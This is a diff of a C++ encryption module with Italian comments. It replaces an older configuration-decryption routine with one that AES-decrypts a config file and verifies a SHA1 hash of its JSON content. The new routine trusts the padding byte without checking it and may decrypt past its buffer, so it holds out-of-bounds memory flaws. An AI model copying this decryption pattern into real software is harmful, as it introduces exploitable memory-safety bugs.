@@ -1,4 +1,5 @@
 #include "Encryption.h"
+#include "Hash.h"
 #include "Conf.h"
 
 #define ENC_SAFE_EXIT(x) 	if(hDstFile != INVALID_HANDLE_VALUE) CloseHandle(hDstFile); \
@@ -88,22 +89,22 @@ BYTE* Encryption::DecryptData(BYTE *pIn, UINT *Len) {
 	return pOut;
 }
 
-BYTE* Encryption::DecryptConf(wstring &strInFile, UINT *uLen) {
+/*BYTE* Encryption::DecryptConf(wstring &strInFile, UINT *uLen) {
 	DWORD dwRead = 0, dwWritten = 0, dwFileSize = 0, dwDataLen, dwUnpadded, crc;
 	BYTE *pRead = NULL, *pWrite = NULL, t_IV[16];
 	HANDLE hConfFile = INVALID_HANDLE_VALUE;
 	wstring strCompletePath;
 
-	/**
-	 * Struttura del file di configurazione
-	 *
-	 * |DWORD|DWORD|DWORD|DATA.....................|CRC|
-	 * |---Skip----|-Len-|
-	 *
-	 * Le prime due DWORD vanno skippate.
-	 * La terza DWORD contiene la lunghezza del blocco di dati
-	 * CRC e' il CRC dei dati in chiaro, inclusa la DWORD Len
-	 */
+	///
+	 // Struttura del file di configurazione
+	 //
+	 // |DWORD|DWORD|DWORD|DATA.....................|CRC|
+	 // |---Skip----|-Len-|
+	 //
+	 // Le prime due DWORD vanno skippate.
+	 // La terza DWORD contiene la lunghezza del blocco di dati
+	 // CRC e' il CRC dei dati in chiaro, inclusa la DWORD Len
+	 ///
 
 	CopyMemory(t_IV, IV, 16);
 
@@ -219,20 +220,92 @@ BYTE* Encryption::DecryptConf(wstring &strInFile, UINT *uLen) {
 	// XXXXX dwUnpadded in realta' non rappresenta la lunghezza unpaddata ma la lunghezza paddata,
 	// e' una cosa che non ha _un cazzo di senso_ ma ci dobbiamo adattare, quindi invece di usare
 	// ENDOF_CONF_DELIMITER per verificare la coerenza del file, dobbiamo usarlo per trovarne la fine!!!!
-	/*
-	BYTE *confEnd = (BYTE *)(pRead + dwUnpadded - sizeof(UINT) - strlen(ENDOF_CONF_DELIMITER) - 1);
+
+}*/
+
+BYTE* Encryption::DecryptConf(wstring &strInFile, UINT *uLen) {
+	DWORD dwRead = 0, dwFileSize = 0;
+	BYTE *pRead = NULL, t_IV[16];
+	HANDLE hConfFile = INVALID_HANDLE_VALUE;
+	wstring strCompletePath;
+	Hash hash;
+	BYTE sha1Conf[20], sha1Runtime[20];
+
+	/**
+	 * Struttura del file di configurazione
+	 *
+	 * config_file = ENC(JSON(config) | SHA(JSON))
+	 */
+
+	CopyMemory(t_IV, IV, 16);
+
+	strCompletePath = GetCurrentPathStr(strInFile);
+
+	if (strCompletePath.empty())
+		return NULL;
+
+	// Apriamo il file di configurazione
+	hConfFile = CreateFile((PWCHAR)strCompletePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	if (hConfFile == INVALID_HANDLE_VALUE)
+		return NULL;
 	
-	if(!RtlCompareMemory(confEnd, ENDOF_CONF_DELIMITER, strlen(ENDOF_CONF_DELIMITER))){
+	// Prendiamo la dimensione del file cifrato
+	dwFileSize = GetFileSize(hConfFile, NULL);
+
+	if (dwFileSize == INVALID_FILE_SIZE || dwFileSize < 36){
+		CloseHandle(hConfFile);
+		return NULL;
+	}
+
+	// Allochiamo memoria per i dati
+	pRead = new(std::nothrow) BYTE[dwFileSize];
+
+	if (pRead == NULL){
+		CloseHandle(hConfFile);
+		return NULL;
+	}
+
+	ZeroMemory(pRead, dwFileSize);
+
+	// Leggiamo il blocco dati prima di decifrarlo
+	if (ReadFile(hConfFile, pRead, dwFileSize, &dwRead, NULL) == FALSE){
 		delete[] pRead;
 		CloseHandle(hConfFile);
 		return NULL;
 	}
-	
-	CloseHandle(hConfFile);
 
-	*uLen = dwUnpadded - 4; // Torna la lunghezza del buffer dati senza CRC
+	if (dwRead != dwFileSize){
+		delete[] pRead;
+		CloseHandle(hConfFile);
+		return NULL;
+	}
+
+	// E decifriamolo
+	aes_cbc_decrypt(&Aes_ctx, (BYTE *)&t_IV, pRead, pRead, GetNextMultiple(dwFileSize));
+
+	// Leggiamo il padding
+	BYTE padding = pRead[dwFileSize - 1];
+	PBYTE pEnd = pRead + dwFileSize - padding;
+
+	// Leggiamo lo SHA1
+	CopyMemory(sha1Conf, pEnd - 20, 20);
+
+	// Verifichiamo l'hash
+	hash.Sha1(pRead, pEnd - pRead - 20, sha1Runtime);
+
+	if (memcmp(sha1Conf, sha1Runtime, 20)){
+		delete[] pRead;
+		CloseHandle(hConfFile);
+		return NULL;
+	}
+
+	// Zero-out the sha1
+	memset(pEnd - 20, 0x00, 20);
+
+	*uLen = pEnd - pRead - 20;
+	CloseHandle(hConfFile);
 	return pRead;
-	*/
 }
 
 WCHAR* Encryption::EncryptName(wstring &strName, BYTE seed) {
